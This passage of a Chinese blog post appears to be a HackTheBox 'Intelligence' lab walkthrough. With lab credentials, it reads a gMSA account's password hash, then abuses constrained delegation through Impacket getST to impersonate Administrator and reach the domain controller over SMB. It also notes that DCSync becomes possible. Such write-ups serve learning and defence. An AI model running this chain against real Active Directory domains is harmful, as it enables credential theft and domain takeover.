+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ldapdomaindump</span>  -u <span class="hljs-string">&quot;intelligence.htb\TED.GRAVES&quot;</span> -p <span class="hljs-string">&quot;Mr.Teddy&quot;</span> intelligence.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008110726034.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008110726034"></p>
+<p>一个个看过去，首先在domain_computers中就能发现一个不同寻常的账户svc_int，它还配置了约束委派的标志位：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008110856112.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008110856112"></p>
+<p>对该机器账户进行更详细的信息收集，使用powersploit的powerview模块，<a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainComputer/">参考</a>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; <span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Mr.Teddy&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>  <br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;intelligence.htb\TED.GRAVES&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Domain</span> intelligence.htb <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Server</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.248</span> svc_int<br></code></pre></td></tr></table></figure>
+
+<p>得到信息如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwdlastset</span>                     : <span class="hljs-number">2021</span>/<span class="hljs-number">10</span>/<span class="hljs-number">7</span> <span class="hljs-number">21</span>:<span class="hljs-number">28</span>:<span class="hljs-number">38</span><br><span class="hljs-attribute">logoncount</span>                     : <span class="hljs-number">0</span><br><span class="hljs-attribute">badpasswordtime</span>                : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">msds</span>-managedpasswordpreviousid : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>...&#125;<br><span class="hljs-attribute">distinguishedname</span>              : CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb<br><span class="hljs-attribute">objectclass</span>                    : &#123;top, person, organizationalPerson, user...&#125;<br><span class="hljs-attribute">name</span>                           : svc_int<br><span class="hljs-attribute">objectsid</span>                      : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">4210132550</span>-<span class="hljs-number">3389855604</span>-<span class="hljs-number">3437519686</span>-<span class="hljs-number">1144</span><br><span class="hljs-attribute">msds</span>-groupmsamembership        : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">128</span>...&#125;<br><span class="hljs-attribute">localpolicyflags</span>               : <span class="hljs-number">0</span><br><span class="hljs-attribute">codepage</span>                       : <span class="hljs-number">0</span><br><span class="hljs-attribute">samaccounttype</span>                 : MACHINE_ACCOUNT<br><span class="hljs-attribute">accountexpires</span>                 : NEVER<br><span class="hljs-attribute">countrycode</span>                    : <span class="hljs-number">0</span><br><span class="hljs-attribute">whenchanged</span>                    : <span class="hljs-number">2021</span>/<span class="hljs-number">10</span>/<span class="hljs-number">7</span> <span class="hljs-number">13</span>:<span class="hljs-number">28</span>:<span class="hljs-number">38</span><br><span class="hljs-attribute">instancetype</span>                   : <span class="hljs-number">4</span><br><span class="hljs-attribute">usncreated</span>                     : <span class="hljs-number">12846</span><br><span class="hljs-attribute">objectguid</span>                     : f180a079-f326-<span class="hljs-number">49</span>b2-<span class="hljs-number">84</span>a1-<span class="hljs-number">34824208</span>d642<br><span class="hljs-attribute">msds</span>-managedpasswordid         : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>...&#125;<br><span class="hljs-attribute">msds</span>-allowedtodelegateto       : WWW/dc.intelligence.htb<br><span class="hljs-attribute">samaccountname</span>                 : svc_int$<br><span class="hljs-attribute">objectcategory</span>                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=h<br>                                 <span class="hljs-attribute">tb</span><br><span class="hljs-attribute">dscorepropagationdata</span>          : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">msds</span>-managedpasswordinterval   : <span class="hljs-number">30</span><br><span class="hljs-attribute">lastlogon</span>                      : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">badpwdcount</span>                    : <span class="hljs-number">0</span><br><span class="hljs-attribute">cn</span>                             : svc_int<br><span class="hljs-attribute">useraccountcontrol</span>             : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION<br><span class="hljs-attribute">whencreated</span>                    : <span class="hljs-number">2021</span>/<span class="hljs-number">4</span>/<span class="hljs-number">19</span> <span class="hljs-number">0</span>:<span class="hljs-number">49</span>:<span class="hljs-number">58</span><br><span class="hljs-attribute">primarygroupid</span>                 : <span class="hljs-number">515</span><br><span class="hljs-attribute">iscriticalsystemobject</span>         : False<br><span class="hljs-attribute">msds</span>-supportedencryptiontypes  : <span class="hljs-number">28</span><br><span class="hljs-attribute">usnchanged</span>                     : <span class="hljs-number">102507</span><br><span class="hljs-attribute">lastlogoff</span>                     : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">dnshostname</span>                    : svc_int.intelligence.htb<br></code></pre></td></tr></table></figure>
+
+
+
+<p>从objectcategory中我们可以看出，该账户是一个GMSA（<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">Group Managed Service Accounts</a>）账户，详见官方文档：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008111335821.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008111335821"></p>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password">PayloadsAllTheThings</a>中，我们能发现对GMSA账户的利用方法：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008111737837.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008111737837"></p>
+<p>尝试进行利用，很幸运地读到了该账户的密码（因为我们的Ted用户是itsupport组的成员之一）：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">╭─root<span class="hljs-variable">@kali</span> ~<span class="hljs-regexp">/Tools/g</span>MSADumper ‹main› <br>╰─<span class="hljs-comment"># python3 gMSADumper.py -u TED.GRAVES -p Mr.Teddy -d intelligence.htb</span><br><br>Users <span class="hljs-keyword">or</span> groups who can read password <span class="hljs-keyword">for</span> svc_int<span class="hljs-variable">$:</span><br> &gt; <span class="hljs-variable constant_">DC</span><span class="hljs-variable">$</span><br><span class="hljs-variable"></span> &gt; itsupport<br>svc_int<span class="hljs-variable">$:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:d170ae19de30439df55d6430e12dd621</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>之后便可以进行约束委派攻击了，但首先我们需要校准时间，否则Kerberos会报错：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">╭─<span class="hljs-symbol">root@</span>kali ~/Tools/gMSADumper ‹main› <br>╰─# getST.py <span class="hljs-built_in">int</span>elligence.htb/svc_int$ -spn WWW/dc.<span class="hljs-built_in">int</span>elligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate Administrator<br>Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.23</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><span class="hljs-string"></span><br><span class="hljs-string">[*]</span> Getting TGT <span class="hljs-keyword">for</span> user<br>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br></code></pre></td></tr></table></figure>
+
+<p>使用ntpdate进行校正：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">╭─root@kali ~/下载 <br>╰─<span class="hljs-comment"># ntpdate dc.intelligence.htb </span><br> <span class="hljs-number">8</span> Oct <span class="hljs-number">05</span>:<span class="hljs-number">36</span>:<span class="hljs-number">13</span> ntpdate[<span class="hljs-number">43971</span>]: step <span class="hljs-built_in">time</span> server <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> <span class="hljs-built_in">offset</span> +<span class="hljs-number">25196.736528</span> <span class="hljs-built_in">sec</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再拿Service Ticket：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">╭─<span class="hljs-symbol">root@</span>kali ~/下载 <br>╰─# getST.py <span class="hljs-built_in">int</span>elligence.htb/svc_int$ -spn WWW/dc.<span class="hljs-built_in">int</span>elligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate Administrator<br>Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.23</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><span class="hljs-string"></span><br><span class="hljs-string">[*]</span> Getting TGT <span class="hljs-keyword">for</span> user<br><span class="hljs-string">[*]</span> Impersonating Administrator<br><span class="hljs-string">[*]</span> 	Requesting S4U2self<br><span class="hljs-string">[*]</span> 	Requesting S4U2Proxy<br><span class="hljs-string">[*]</span> Saving ticket <span class="hljs-keyword">in</span> Administrator.ccache<br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，<strong>还可以访问使用与模拟帐户权限允许的任何服务</strong>。（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执 行 DCSync。</p>
+</blockquote>
+<p>export后使用impacket中的smbclient模块登录拿flag即可：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator.ccache<br>impacket-smbclient intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008095012419.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008095012419"></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - Intelligence</div>
+      <div>https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/Intelligence/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox - Driver</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall">
+                        <span class="hidden-mobile">HackTheBox - Horizontall</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
